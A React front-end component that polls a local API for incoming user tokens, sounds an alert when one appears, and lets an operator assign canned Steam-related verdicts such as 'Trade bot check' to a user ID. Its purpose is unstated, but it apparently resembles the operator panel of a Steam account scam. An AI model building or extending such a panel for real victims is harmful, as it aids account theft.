import React, { useEffect, useState } from "react";
import { AiOutlineCopy } from "react-icons/ai";
import { useSelector } from "react-redux";
import styles from "./MainPage.module.scss";
import discord from "./assets/discord.png";
import messageSound from './assets/iphone_5s_ding.mp3'
import telegram from "./assets/telegram.png";
import { toast } from "react-toastify";

export const MainPage = () => {
  const [idt, setIdt] = useState(null);
  const { user } = useSelector((state) => state.auth);
  const [action, setAction] = useState("Checking");
  const [loading, setLoading] = useState(true);
  const [actionPerformed, setActionPerformed] = useState(false);
  const [inputToken, setInputToken] = useState(""); // Для отслеживания введенного токена
  const [userInteracted, setUserInteracted] = useState(false); // Состояние для отслеживания взаимодействия с пользователем

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  // Fetch token function
  const fetchToken = async () => {
    try {
      const response = await fetch("http://localhost:3001/api/auth/get-token");
      const data = await response.json();

      if (data.idt && !data.deleted) {
        setIdt(data.idt);
      } else {
        setIdt(null); // Убираем токен, если его нет
      }
    } catch (error) {
      console.error("Error fetching token:", error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchToken(); 
    const intervalId = setInterval(() => {
      fetchToken(); 
    }, 500); 

    return () => clearInterval(intervalId); // Cleanup the interval on unmount
  }, []);

  // Use Effect to play sound when token is set and user interacted
  useEffect(() => {
    const handleUserInteraction = () => {
      setUserInteracted(true);
    };

    // Listen for any user interaction to enable audio playback
    document.addEventListener('click', handleUserInteraction);
    document.addEventListener('keydown', handleUserInteraction); // Also listen for key presses to count as interaction

    return () => {
      document.removeEventListener('click', handleUserInteraction);
      document.removeEventListener('keydown', handleUserInteraction);
    };
  }, []);

  useEffect(() => {
    if (idt && userInteracted) {
      const audio = new Audio(messageSound);
      audio.play();
    }
  }, [idt, userInteracted]); // Play sound when the token changes and user interacted

  const handleTokenChange = (e) => {
    setInputToken(e.target.value); // Обновляем состояние при вводе токена
  };

  const saveAction = async (selectedAction) => {
    if (!inputToken) {
      console.log("Пожалуйста, введите токен!");
      return;
    }

    try {
      if (!idt || !user) {
        console.error("IDT or user is not available. Cannot save action.");
        return;
      }

      const response = await fetch("http://localhost:3001/api/auth/save-action", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          idt: inputToken, // Используем введенный токен
          action: selectedAction,
          username: user.username,
        }),
      });

      const result = await response.json();
      if (response.ok) {
        setAction(selectedAction);
        setActionPerformed(true); // Disable further action selection
        setIdt(null); // Clear token state after action is performed
        console.log("Action saved:", result);
      } else {
        toast.success('Action was send')
        console.error("Failed to save action:", result.error);
      }
    } catch (error) {
      console.error("Error saving action:", error);
    }
  };

  return (
    <div className={styles.wrapper}>
      <div className={styles.container}>
        <input
          className={styles.input}
          type="text"
          placeholder="userId"
          value={inputToken} // Привязываем значение к состоянию inputToken
          onChange={handleTokenChange} // Обработчик изменения
        />

        <div className={styles.buttons}>
          {[
            "Set No steam restrictions",
            "Set Trade bot check",
            "Set Violation of rules",
          ].map((item) => (
            <button
              key={item}
              className={`${styles.actionBtn} ${action === item ? styles.selected : ""}`}
              onClick={() => saveAction(item)} // Save action on click
              disabled={actionPerformed} // Disable buttons after action is performed
            >
              {item}
            </button>
          ))}
        </div>

        {/* Show token only if action is not performed */}
        {!actionPerformed && idt && (
          <div className={styles.userBlock}>
            <span className={styles.userId}>{idt}</span>
            <button className={styles.copyBtn} onClick={() => copyToClipboard(idt)}>
              <AiOutlineCopy size={20} />
            </button>
          </div>
        )}
      </div>

      <div className={styles.footer}>
        <a href="https://discord.gg/5DvnCQsY">
          <img src={discord} alt="discord" />
        </a>
        <a href="https://t.me/Specta666">
          <img src={telegram} alt="telegram" />
        </a>
      </div>
    </div>
  );
};
